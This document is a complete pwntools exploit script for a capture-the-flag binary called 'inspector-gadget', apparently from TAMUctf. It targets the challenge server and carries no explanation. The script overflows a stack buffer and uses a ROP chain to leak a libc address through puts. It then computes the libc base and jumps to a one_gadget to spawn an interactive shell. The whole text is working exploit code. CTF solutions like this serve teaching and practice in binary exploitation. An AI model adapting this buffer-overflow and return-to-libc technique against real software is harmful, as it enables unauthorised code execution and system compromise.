#!/usr/bin/python3

from pwn import *

exe = ELF('inspector-gadget', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*pwnme+42

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote("tamuctf.com", 443, ssl=True, sni="inspector-gadget")
else:
    p = process(exe.path)

GDB()
pop_rsp_r13_r14_r15 = 0x0000000000401275
pop_rdi = 0x000000000040127b
payload = b"a"*24
payload += p64(pop_rdi) + p64(exe.sym['stderr']) + p64(exe.plt['puts'])
payload += p64(exe.sym['main'])


sa(b"me\n", payload)
libc_leak = u64(p.recv(6) + b"\0\0")
info("leak libc: " + hex(libc_leak))
libc_base = libc_leak - libc.sym['_IO_2_1_stderr_']
info("leak libc: " + hex(libc_base))
payload = b"a"*24
payload += p64(libc_base + 0x449d3)
payload += p64(0) * 10
sa(b"me\n", payload)
p.interactive()
